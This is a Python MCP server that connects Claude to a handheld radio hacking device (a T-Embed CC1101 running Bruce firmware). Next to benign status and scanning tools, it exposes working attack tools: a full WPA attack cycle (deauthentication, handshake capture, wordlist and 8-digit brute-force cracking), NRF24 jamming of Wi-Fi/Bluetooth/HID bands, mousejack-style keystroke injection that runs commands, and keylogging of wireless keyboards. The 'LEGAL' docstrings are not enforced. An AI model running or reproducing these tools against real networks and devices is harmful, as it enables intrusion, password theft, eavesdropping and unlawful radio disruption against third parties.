#!/usr/bin/env python3
"""MCP server exposing the Treecataje companion device to Claude.

Wraps the companion wire protocol (host/companion_proto.py) so Claude can read
from and control the LilyGO T-Embed CC1101 over USB (BLE transport will be added
later via the same core). Launched by Claude Code over stdio (see .mcp.json).

Tools:
  device_connect   (re)open transport + HELLO handshake (auth token)
  device_info      cached HELLO info (fw / board / mtu / caps)
  device_status    device status (battery / radio / SD / WiFi)
  device_caps      capability list
  device_busy      radio owner / busy state
  device_run       run ANY firmware CLI command via REQ, return output + code
  device_file_get/put/analyze/stream  files + capture analysis + EVT streaming
  device_set_token/clear_token/token_status  manage the auth token (Phase 6)
  device_disconnect close the transport

Env: COMPANION_PORT (default /dev/ttyACM1), COMPANION_TOKEN (default "").
"""
import os
import sys
import threading

# Ensure sibling import works regardless of launch cwd.
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from companion_proto import Companion  # noqa: E402
from mcp.server.fastmcp import FastMCP  # noqa: E402

DEFAULT_PORT = os.environ.get("COMPANION_PORT", "/dev/ttyACM1")
DEFAULT_TOKEN = os.environ.get("COMPANION_TOKEN", "")

mcp = FastMCP("treecataje-device")


class BleSync:
    """Synchronous facade over the async BLE client (companion_ble), driven on a
    dedicated background asyncio loop. Same interface as Companion so the tools
    are transport-agnostic. (BLE must be enabled on the device first via
    'companion ble on' over USB.)"""

    def __init__(self, name="Bruc", token=""):
        import asyncio
        from companion_ble import BleCompanion
        from companion_proto import file_get_via, file_put_via
        self._asyncio = asyncio
        self._fg, self._fp = file_get_via, file_put_via
        self._loop = asyncio.new_event_loop()
        self._thr = threading.Thread(target=self._loop.run_forever, daemon=True)
        self._thr.start()
        self.name = name

        async def _setup():
            # Build the client INSIDE the loop so its asyncio.Queue binds here.
            self.ble = BleCompanion(name=name)
            await self.ble.connect()
            return await self.ble.hello(token)
        self.info = self._run(_setup(), timeout=40)

    def _run(self, coro, timeout=130):
        return self._asyncio.run_coroutine_threadsafe(coro, self._loop).result(timeout)

    def hello(self, token="", timeout=6.0):
        return self.info

    def request(self, cmd, timeout=8.0):
        return self._run(self.ble.request(cmd, timeout), timeout=timeout + 10)

    def file_get(self, remote, local=None, chunk=192, timeout=180):
        return self._fg(self.request, remote, local, chunk, timeout)

    def file_put(self, local, remote, chunk=192, timeout=180):
        return self._fp(self.request, local, remote, chunk, timeout)

    def stream(self, kind="telemetry", duration=5.0, max_events=None):
        return self._run(self.ble.stream(kind, duration, max_events), timeout=duration + 20)

    def close(self):
        try:
            self._run(self.ble.close(), timeout=10)
        finally:
            self._loop.call_soon_threadsafe(self._loop.stop)


_lock = threading.Lock()
_dev = None
_info: dict = {}
_port = DEFAULT_PORT
_transport = "usb"


def _ensure(transport=None, port=None, name="Bruc", token=None) -> dict:
    """Connect (if needed) and run HELLO. Returns the HELLO info dict."""
    global _dev, _info, _port, _transport
    if port:
        _port = port
    if transport:
        _transport = transport
    tok = DEFAULT_TOKEN if token is None else token
    if _dev is None:
        if _transport == "ble":
            _dev = BleSync(name=name, token=tok)
            _info = _dev.info
        else:
            _dev = Companion(_port)
            _info = _dev.hello(tok)
        if not _info.get("ok"):
            raise RuntimeError(f"HELLO failed: {_info.get('raw').error if _info.get('raw') else _info}")
    return _info


def _fmt(resp) -> str:
    body = "\n".join(resp.lines) if resp.lines else "(no output)"
    if resp.ok:
        return f"{body}\n[END code={resp.code}]"
    return f"ERROR code={resp.code}: {resp.error}\n{body}"


@mcp.tool()
def device_connect(transport: str = "usb", port: str = DEFAULT_PORT,
                   name: str = "Bruc", token: str = "") -> str:
    """Open a transport to the device and perform the HELLO handshake.

    transport: "usb" (default, /dev/ttyACM1) or "ble".
    For BLE, the device must already be advertising — enable it first over USB:
      device_connect(transport="usb"); device_run("companion ble on"); device_disconnect()
    then device_connect(transport="ble"). name = BLE advertised name (default Bruc).
    token: companion auth token (empty = open/lab mode).
    """
    global _dev, _info
    with _lock:
        try:
            if _dev is not None:
                _dev.close()
                _dev = None
            info = _ensure(transport=transport, port=port, name=name, token=token)
        except Exception as e:  # noqa: BLE001
            return f"connect failed: {e}"
    caps = ",".join(info.get("caps", []))
    return (f"connected transport={transport} fw={info.get('fw')} board={info.get('board')} "
            f"mtu={info.get('mtu')} name={info.get('name')}\ncaps={caps}")


@mcp.tool()
def device_info() -> str:
    """Return cached HELLO info (fw / board / mtu / caps). Connects if needed."""
    with _lock:
        try:
            info = _ensure()
        except Exception as e:  # noqa: BLE001
            return f"not connected: {e}"
    caps = ",".join(info.get("caps", []))
    return (f"fw={info.get('fw')} board={info.get('board')} mtu={info.get('mtu')} "
            f"name={info.get('name')} proto={info.get('proto')}\ncaps={caps}")


@mcp.tool()
def device_status() -> str:
    """Device status: battery, radio module, SD card, WiFi/BLE connectivity."""
    with _lock:
        try:
            _ensure()
            return _fmt(_dev.request("status"))
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_caps() -> str:
    """List capability groups compiled into the firmware (from HELLO)."""
    with _lock:
        try:
            _ensure()
            return _fmt(_dev.request("companion caps"))
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_busy() -> str:
    """Report the current radio owner / busy state (none|ui|companion)."""
    with _lock:
        try:
            _ensure()
            return _fmt(_dev.request("companion busy"))
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_run(command: str, timeout: float = 6.0) -> str:
    """Run ANY firmware CLI command on the device and return its output + END code.

    The command is the raw Bruce CLI line, e.g. "wifi scan", "free", "uptime",
    "rf scan", "storage list /". See docs/companion/command-catalog.md.
    Note: live/high-rate commands stream slowly over the link; prefer capture +
    file transfer for those.
    """
    with _lock:
        try:
            _ensure()
            return _fmt(_dev.request(command, timeout=timeout))
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_file_get(remote_path: str, local_path: str = "", chunk: int = 512, timeout: float = 60.0) -> str:
    """Download a file from the device (SD/flash) to the host.

    Chunked base64 transfer with sha256 verification. remote_path e.g. "/bruce.conf".
    local_path: optional host path to save to (else just returns size+sha256).
    Over BLE keep chunk small (MTU-limited); over USB 512 is fine.
    """
    with _lock:
        try:
            _ensure()
            out = _dev.file_get(remote_path, local_path or None, chunk=chunk, timeout=timeout)
            saved = f" saved={out['path']}" if "path" in out else ""
            return f"ok size={out['size']} sha256={out['sha256']}{saved}"
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_file_put(local_path: str, remote_path: str, chunk: int = 512, timeout: float = 60.0) -> str:
    """Upload a host file to the device (SD/flash).

    Chunked base64 transfer with sha256 verification on the device side.
    """
    with _lock:
        try:
            _ensure()
            out = _dev.file_put(local_path, remote_path, chunk=chunk, timeout=timeout)
            return f"ok={out['ok']} sha256={out['sha256']} {' '.join(out['lines'])}"
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_analyze(remote_path: str, chunk: int = 512, timeout: float = 120.0) -> str:
    """Fetch a capture/log file from the device and analyze it on the host.

    Host-compute augmentation: auto-detects NRF24 scan logs, battery CSV, pcap
    captures, or falls back to a text/hex head. Returns a human-readable report
    (with ASCII histograms/sparklines). e.g. remote_path "/nrf_scan.log".
    """
    with _lock:
        try:
            _ensure()
            out = _dev.file_get(remote_path, None, chunk=chunk, timeout=timeout)
            import companion_compute
            return companion_compute.analyze(remote_path, out["data"])
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_stream(kind: str = "telemetry", duration: float = 5.0, max_events: int = 0) -> str:
    """Start an async stream on the device, collect EVT events for `duration`
    seconds, then stop. Returns the collected events.

    kinds:
      telemetry  live device vitals (ms / free heap), 1 Hz
      wifi       async WiFi scan — one "wifi seq=.. count=N" header + one
                 "wifi net ch=.. rssi=.. enc=.. bssid=.. ssid=.." per network
      nrf        NRF24 RPD spectrum sweep (2.4 GHz, 80 ch) — "nrf seq=.. active=
                 ch:hits,.. peak_ch=.. peak=.." (keep the device screen idle:
                 NRF24 shares the TFT SPI bus on T-Embed).
      rf         CC1101 sub-GHz RSSI sweep — "rf seq=.. f0=.. f1=.. peak_f=..
                 rssi=v0,v1,..". Pass a band: kind="rf 433 435" (MHz). Keep the
                 device screen idle (CC1101 shares the TFT SPI bus).
    Optional: append "interval=<ms>" to the kind to change the emit cadence,
    e.g. kind="telemetry interval=500".
    """
    with _lock:
        try:
            _ensure()
            out = _dev.stream(kind, duration=duration, max_events=(max_events or None))
            evs = "\n".join(out["events"]) or "(no events)"
            return f"start: {' '.join(out['start'])}\nevents ({len(out['events'])}):\n{evs}"
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_stream_analyze(kind: str = "wifi", duration: float = 6.0) -> str:
    """Run a radio stream and return a host-computed, human-readable analysis
    instead of raw events. Best for wifi/nrf/rf:
      wifi -> deduped AP table (RSSI/ch/enc/ssid) + channel histogram
      nrf  -> per-channel 2.4 GHz activity histogram
      rf   -> sub-GHz spectrum (ASCII) + strongest bins; pass kind="rf 433 435"
    For telemetry it just echoes the events. duration in seconds.
    """
    with _lock:
        try:
            _ensure()
            out = _dev.stream(kind, duration=duration)
            import companion_compute
            return companion_compute.analyze_stream(kind, out["events"])
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_capture(kind: str = "wifi", duration: float = 15.0, interval: float = 0.0,
                   fetch: bool = True) -> str:
    """Capture a radio sweep TO A FILE on the device's SD, then (by default) fetch
    and analyze it. Unlike device_stream, the device logs every sweep to storage —
    so it survives a host disconnect and isn't throttled by a slow BLE link. Best
    for long unattended captures.

    kind: telemetry | wifi | nrf | rf (pass a band: kind="rf 433 435"). Same SPI
          caveat as device_stream for nrf/rf (keep the device screen idle).
    duration: seconds the capture runs on-device.
    interval: optional sweep cadence in ms (200..10000); 0 = device default (1 Hz).
    fetch: when True, download the file, verify its sha256, and return a
           host-computed analysis. When False, leave it on the device and just
           report the path/bytes/samples (fetch later with device_analyze).
    """
    with _lock:
        try:
            _ensure()
            iv = int(interval) if interval else None
            if fetch:
                cap = _dev.capture_fetch(kind, duration=duration, interval=iv)
                import companion_compute
                analysis = companion_compute.analyze_stream_file(cap["local"])
                vr = "verified" if cap.get("verified") else "UNVERIFIED sha256!"
                return (f"captured {cap['kind']}: {cap['samples']} samples, "
                        f"{cap['bytes']} B -> {cap['path']} ({vr})\n"
                        f"local: {cap['local']}\n\n{analysis}")
            cap = _dev.capture(kind, duration=duration, interval=iv)
            return (f"captured {cap['kind']} on device: {cap['samples']} samples, "
                    f"{cap['bytes']} B\npath: {cap['path']}\nsha256: {cap['sha256']}\n"
                    f"(fetch with device_analyze remote_path=\"{cap['path']}\")")
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_set_token(token: str) -> str:
    """Set (or change) the device's companion auth token and persist it.

    Requires an already-authenticated session (connect over USB in open mode
    first if no token is set yet). Once set, the token is MANDATORY for BLE and
    is enforced on USB too — keep it; reconnect with device_connect(token=...).
    Pass an empty string is NOT how you clear it — use device_clear_token().
    """
    with _lock:
        try:
            _ensure()
            r = _dev.request("companion token set " + token, timeout=8.0)
            return _fmt(r)
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_clear_token() -> str:
    """Clear the device's companion token (returns to open/USB-only mode).
    Requires an authenticated session."""
    with _lock:
        try:
            _ensure()
            return _fmt(_dev.request("companion token clear", timeout=8.0))
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_token_status() -> str:
    """Report whether a companion auth token is configured (does not reveal it)."""
    with _lock:
        try:
            _ensure()
            return _fmt(_dev.request("companion token status", timeout=8.0))
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_recon(seconds: float = 6.0) -> str:
    """One-shot RF recon: stream WiFi, NRF24, and sub-GHz in sequence, analyze
    each on the host, and return a combined report (AP table+vendors, NRF channel
    activity, sub-GHz spectrum). `seconds` ~ the WiFi window; nrf/rf use ~70%."""
    with _lock:
        try:
            _ensure()
            import companion_compute as cc
            fn = lambda k, s: _dev.stream(k, duration=s).get("events", [])
            results = cc.run_recon(fn, wifi_s=seconds, nrf_s=max(2.0, seconds * 0.7),
                                   rf_s=max(2.0, seconds * 0.7))
            return cc.recon_report(results)
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_dict_list(category: str = "all") -> str:
    """List the host dictionaries (curated, device-compatible reference data).
    category: all | ir | rfid | subghz. Shows IR brands/signals, RFID key files,
    and sub-GHz captures available to send/deploy."""
    try:
        import companion_dicts as cd
        out = []
        if category in ("all", "ir"):
            by = {}
            for e in cd.ir_entries():
                by.setdefault(e["brand"], []).append(e)
            out.append("IR signals:")
            for brand in sorted(by):
                names = ", ".join(s["name"] for s in by[brand])
                out.append(f"  {brand}: {names}")
        if category in ("all", "rfid"):
            out.append("RFID key dicts:")
            for p in cd.key_files():
                out.append(f"  {os.path.basename(p)} ({len(cd.parse_keys(p))} keys)")
        if category in ("all", "subghz"):
            subs = cd.sub_files()
            out.append("Sub-GHz: " + (", ".join(os.path.basename(p) for p in subs) or "(none)"))
        return "\n".join(out)
    except Exception as e:  # noqa: BLE001
        return f"error: {e}"


@mcp.tool()
def device_ir_send(brand: str, name: str = "Power") -> str:
    """Send an IR signal from the host dictionary via 'ir tx' (no upload).
    brand e.g. "Samsung_TV", name e.g. "Power"/"Vol_up". See device_dict_list."""
    with _lock:
        try:
            _ensure()
            import companion_dicts as cd
            match = [e for e in cd.ir_entries()
                     if e["brand"].lower() == brand.lower() and e["name"].lower() == name.lower()]
            if not match:
                return f"no IR signal {brand}/{name} (see device_dict_list)"
            line = cd.ir_tx_line(match[0])
            if not line:
                return "raw IR signal — deploy + ir tx_from_file instead"
            return _fmt(_dev.request(line, timeout=8.0))
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_deploy_keys(keyfile: str = "") -> str:
    """Build a MIFARE keys.conf from the host RFID dictionary(ies) and upload it
    to the device (/BruceRFID/keys.conf). keyfile: a specific *.keys basename, or
    empty to merge all."""
    with _lock:
        try:
            _ensure()
            import companion_dicts as cd, tempfile
            files = cd.key_files()
            if keyfile:
                files = [p for p in files if os.path.basename(p) == keyfile]
                if not files:
                    return f"no key file {keyfile}"
            text = cd.build_keys_conf(files)
            tmp = os.path.join(tempfile.gettempdir(), "keys.conf")
            with open(tmp, "w") as fh:
                fh.write(text)
            out = _dev.file_put(tmp, cd.DEV_RFID_KEYS, chunk=192 if _transport == "ble" else 512, timeout=60)
            n = sum(1 for ln in text.splitlines() if not ln.startswith("//"))
            return f"deployed {n} keys -> {cd.DEV_RFID_KEYS}  ok={out['ok']}"
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


_WORDLIST_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dictionaries", "wordlists")
DEV_HANDSHAKE_DIR = "/BrucePCAP/handshakes"


def _resolve_wordlist(wordlist: str) -> str:
    """Accept an absolute path, a bare name found among discovered wordlists, or
    '' (-> the largest discovered wordlist, e.g. rockyou, else common.txt)."""
    import crackers as ck
    if wordlist and os.path.isfile(wordlist):
        return wordlist
    wls = ck.list_wordlists()
    if wordlist:
        for _lbl, p, _sz in wls:
            if os.path.basename(p) == wordlist or wordlist in p:
                return p
    if wls:  # prefer the biggest (rockyou) when unspecified
        return max(wls, key=lambda x: x[2])[1]
    return os.path.join(_WORDLIST_DIR, "common.txt")


@mcp.tool()
def list_crackers() -> str:
    """List the password-cracking tools available (aircrack-ng/hashcat/python)
    and the wordlists discovered on disk (used by wpa_crack/device_wifi_attack)."""
    import crackers as ck
    out = ["crackers: " + ", ".join(ck.available_tools()), "wordlists:"]
    for lbl, p, _sz in ck.list_wordlists():
        out.append(f"  {lbl}  {p}")
    return "\n".join(out) or "(none)"


@mcp.tool()
def wpa_crack(pcap_path: str, wordlist: str = "", tool: str = "auto", brute: bool = False) -> str:
    """Crack a WPA/WPA2 handshake from a LOCAL pcap using a real cracker
    (aircrack-ng/hashcat, else pure-Python).

    pcap_path: libpcap with 802.11 frames (DLT 105 or radiotap).
    wordlist: path / bare name / '' for the largest discovered (e.g. rockyou).
    tool: auto|aircrack-ng|hashcat|python. brute: if the wordlist fails, brute
    all 8-digit numeric passwords. Returns the recovered passphrase or status.
    """
    try:
        import crackers as ck
        if not os.path.isfile(pcap_path):
            return f"error: no such pcap {pcap_path}"
        wl = _resolve_wordlist(wordlist)
        bssid = ck.detect_bssid(pcap_path)
        hc = pcap_path.rsplit(".", 1)[0] + ".hc22000"
        try:
            import wpa_crack as wcm
            wcm.export_hc22000(pcap_path, hc)
        except Exception:  # noqa: BLE001
            hc = ""
        res = ck.crack_wordlist(pcap_path, wl, bssid=bssid, tool=tool, hc22000=hc)
        if not res["ok"] and brute:
            res = ck.crack_brute(pcap_path, "0123456789", 8, bssid=bssid, tool=tool, hc22000=hc)
        if res["ok"]:
            return f"[KEY FOUND] {res['key']}\n  tool: {res['tool']}  wordlist: {wl}  bssid: {bssid}"
        return (f"[not found] via {res.get('tool')} (wordlist {os.path.basename(wl)}"
                + (", +8-digit brute" if brute else "") + f", bssid {bssid or '?'})")
    except Exception as e:  # noqa: BLE001
        return f"error: {e}"


@mcp.tool()
def device_handshakes() -> str:
    """List WPA handshake pcap files the device's sniffer has saved to
    /BrucePCAP/handshakes (capture them on-device via the WiFi sniffer first)."""
    with _lock:
        try:
            _ensure()
            r = _dev.request(f"ls {DEV_HANDSHAKE_DIR}", timeout=8.0)
            body = "\n".join(r.lines) or "(empty or no such dir)"
            return f"{DEV_HANDSHAKE_DIR}:\n{body}"
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_crack_handshake(remote_pcap: str, wordlist: str = "", tool: str = "auto",
                           brute: bool = False) -> str:
    """Fetch a handshake pcap FROM THE DEVICE (sha256-verified) and crack it with a
    real cracker. remote_pcap: device path (see device_handshakes). wordlist/tool/
    brute as in wpa_crack."""
    with _lock:
        try:
            _ensure()
            import tempfile, crackers as ck, wpa_crack as wcm
            local = os.path.join(tempfile.gettempdir(), os.path.basename(remote_pcap) or "hs.pcap")
            got = _dev.file_get(remote_pcap, local,
                                chunk=192 if _transport == "ble" else 512, timeout=120)
            wl = _resolve_wordlist(wordlist)
            bssid = ck.detect_bssid(local)
            hc = local.rsplit(".", 1)[0] + ".hc22000"
            try:
                wcm.export_hc22000(local, hc)
            except Exception:  # noqa: BLE001
                hc = ""
            res = ck.crack_wordlist(local, wl, bssid=bssid, tool=tool, hc22000=hc)
            if not res["ok"] and brute:
                res = ck.crack_brute(local, "0123456789", 8, bssid=bssid, tool=tool, hc22000=hc)
            head = f"fetched {remote_pcap} ({got.get('size', '?')} B, sha {got.get('sha256', '')[:12]}…)\n"
            if res["ok"]:
                return head + f"[KEY FOUND] {res['key']}  (tool {res['tool']}, bssid {bssid})"
            return head + f"[not found] via {res.get('tool')} (wordlist {os.path.basename(wl)})"
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_deauth(bssid: str, sta: str = "broadcast", ch: int = 0, count: int = 16) -> str:
    """Inject WiFi deauthentication frames at an AP to knock client(s) off (forces
    a re-auth → fresh 4-way handshake). bssid: AP MAC. sta: a client MAC or
    'broadcast'. ch: channel to send on. count: frames.

    LEGAL: only against networks you own / are authorized to test."""
    with _lock:
        try:
            _ensure()
            r = _dev.deauth(bssid, sta, ch, count)
            return _fmt(r)
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_wifi_attack(ssid: str = "", bssid: str = "", ch: int = 0, wordlist: str = "",
                       tool: str = "auto", brute: bool = False, capture_secs: float = 20.0,
                       deauth_count: int = 16, rounds: int = 3) -> str:
    """Full WPA attack cycle on the device: find AP → deauth → capture handshake →
    fetch → crack with a real cracker (aircrack-ng/hashcat) → optional 8-digit brute.

    Give ssid (auto-scans for bssid+channel) or bssid+ch directly. wordlist: path /
    bare name / '' for the largest discovered (rockyou). tool: auto|aircrack-ng|
    hashcat|python. brute: brute all 8-digit numerics if the wordlist fails.
    capture_secs/deauth_count/rounds tune the capture.

    LEGAL: authorized testing of your OWN network only — deauth is an active attack."""
    with _lock:
        try:
            _ensure()
            import wifi_attack, tempfile
            wl = _resolve_wordlist(wordlist)
            logs = []
            out = wifi_attack.run_attack(
                _dev, ssid=ssid, bssid=bssid, ch=ch, wordlist=wl, brute=brute, tool=tool,
                capture_secs=capture_secs, deauth_count=deauth_count, rounds=rounds,
                local_dir=tempfile.gettempdir(), log=logs.append)
            return "\n".join(logs) + "\n\n" + wifi_attack.format_result(out)
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_nrf_scan(ms: int = 4000) -> str:
    """Scan for NRF24 devices (2.4 GHz HID dongles etc.). Returns a list of
    {channel, address, hits}, strongest first. Keep the device screen idle (NRF24
    shares the TFT SPI bus on T-Embed)."""
    with _lock:
        try:
            _ensure()
            devs = _dev.nrf_scan(ms)
            if not devs:
                return "no NRF24 devices found"
            lines = ["%2d  ch%-3d  %s  hits=%d" % (i + 1, d["ch"], d["addr"], d["hits"])
                     for i, d in enumerate(devs)]
            return "NRF24 devices:\n" + "\n".join(lines)
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_nrf_jam(preset: str = "", channel: int = 0, secs: int = 3, start: int = 1,
                   stop: int = 80, step: int = 2, dwell: int = 60, noise: int = 0) -> str:
    """Jam NRF24 (2.4 GHz). Priority: preset > channel > custom sweep.
      preset: a band name — wifi|bt|ble|ble_adv|hid|mic|usb|video|rc|full|hopping
      channel>0: constant-carrier jam that single channel for `secs`
      else: sweep-jam the [start,stop] range (step/dwell/noise)

    LEGAL: authorized testing of your own devices only — jamming is disruptive."""
    with _lock:
        try:
            _ensure()
            if preset:
                return _fmt(_dev.nrf_jam_preset(preset))
            if channel > 0:
                return _fmt(_dev.nrf_jam_channel(channel, secs))
            return _fmt(_dev.nrf_jam_sweep(start, stop, step, dwell, noise))
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_nrf_jam_presets() -> str:
    """List the NRF24 jam band presets (name → channel range + description)."""
    from companion_proto import NRF_JAM_PRESETS
    return "\n".join("%-8s %-40s %s" % (n, p["desc"], p["range"])
                     for n, p in NRF_JAM_PRESETS.items())


@mcp.tool()
def device_nrf_hijack(addr: str, channel: int, action: str = "calc", arg: str = "",
                      proto: str = "logi") -> str:
    """HID-inject against an NRF24 dongle (mousejack-style). addr: 10 hex chars
    (5-byte address, from device_nrf_scan). action: type|run|calc|cmd|jam. arg: a
    single token (text for type, command for run, seconds for jam). proto:
    logi (Logitech Unifying) | hid (generic).

    LEGAL: authorized testing of your own devices only."""
    with _lock:
        try:
            _ensure()
            return _fmt(_dev.nrf_hijack(addr, channel, action, arg, proto))
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_nrf_readkeys(addr: str, channel: int, secs: int = 15) -> str:
    """Sniff and decode HID keystrokes from a target NRF24 device. Cleartext HID
    keyboards are decoded directly; Microsoft 2.4GHz keyboards are XOR-decrypted
    with the address (best-effort); encrypted (Logitech AES Unifying) payloads are
    flagged. addr: 10 hex chars (from device_nrf_scan). Returns decoded keys + the
    reconstructed typed text.

    LEGAL: authorized testing of your own devices only."""
    with _lock:
        try:
            _ensure()
            res = _dev.nrf_readkeys(addr, channel, secs)
            body = "\n".join("  " + l for l in res["lines"]
                             if l.startswith(("[KEY", "[ENC", "[NRF")))
            out = body or "(no output)"
            if res["text"]:
                out += "\n\ntyped: " + repr(res["text"])
            return out
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_audio_tx(text: str = "", file: str = "", freq: float = 433.92,
                    dev: float = 4.0, rate: int = 8000, osr: int = 32,
                    reps: int = 1, voice: str = "auto") -> str:
    """Transmit analog FM voice/audio over the CC1101 (~433/443 MHz) for analog
    radios/walkie-talkies. Provide either text= (rendered via TTS) or file= (any
    audio file: wav/mp3/ogg). The host converts to 8-bit mono PCM and the device
    plays it as a sigma-delta -> 2-FSK FM stream. freq MHz, dev = FM deviation kHz
    (2.5 = narrowband), rate = PCM Hz, osr = oversampling, reps = repeat count,
    voice = TTS voice (auto detects Cyrillic->ru, or en/ru/en+f3/…).

    LEGAL: transmit only on frequencies you are permitted to use, to your own
    radios. RF transmission is regulated."""
    if not text and not file:
        return "error: provide text= (TTS) or file= (audio file)"
    with _lock:
        try:
            _ensure()
            import audio_tx
            lines = []
            res = audio_tx.transmit(_dev, source=file or None, text=text or None,
                                    freq=freq, dev_khz=dev, rate=rate, osr=osr,
                                    reps=reps, voice=voice, log=lines.append)
            head = (f"audio tx {'ok' if res['ok'] else 'FAILED'}: "
                    f"{res['bytes']}B {res['secs']:.1f}s x{reps} @ {freq:g}MHz")
            return head + "\n" + "\n".join(lines)
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_audio_rx(freq: float = 433.92, wait: int = 30, secs: int = 20,
                    rssi: int = -90, rate: int = 100000, out: str = "") -> str:
    """Carrier-triggered analog audio capture over the CC1101 (~433/443 MHz).
    Live FM monitoring isn't possible on this chip, so this arms on a carrier:
    it waits up to `wait`s for RSSI>=`rssi` dBm on `freq`, records the demodulated
    GDO0 bitstream at `rate` Hz until the carrier drops (or `secs`), then fetches
    it and reconstructs a WAV (saved to `out` if given, under /tmp otherwise).
    Returns the saved WAV path + capture stats, or a no-carrier note.

    LEGAL: receive only on frequencies you are permitted to monitor."""
    with _lock:
        try:
            _ensure()
            import audio_tx
            lines = []
            res = audio_tx.record(_dev, freq=freq, wait=wait, secs=secs, rssi=rssi,
                                  rate=rate, out_wav=(out or None), play=False,
                                  log=lines.append)
            if not res:
                return "no carrier captured\n" + "\n".join(lines)
            return (f"captured {res['secs']:.1f}s @ {freq:g} MHz -> {res['wav']} "
                    f"({res['rate']} Hz)\n" + "\n".join(lines))
        except Exception as e:  # noqa: BLE001
            return f"error: {e}"


@mcp.tool()
def device_disconnect() -> str:
    """Close the transport to the device."""
    global _dev
    with _lock:
        if _dev is not None:
            try:
                _dev.close()
            except Exception:  # noqa: BLE001
                pass
            _dev = None
        return "disconnected"


if __name__ == "__main__":
    mcp.run()  # stdio transport
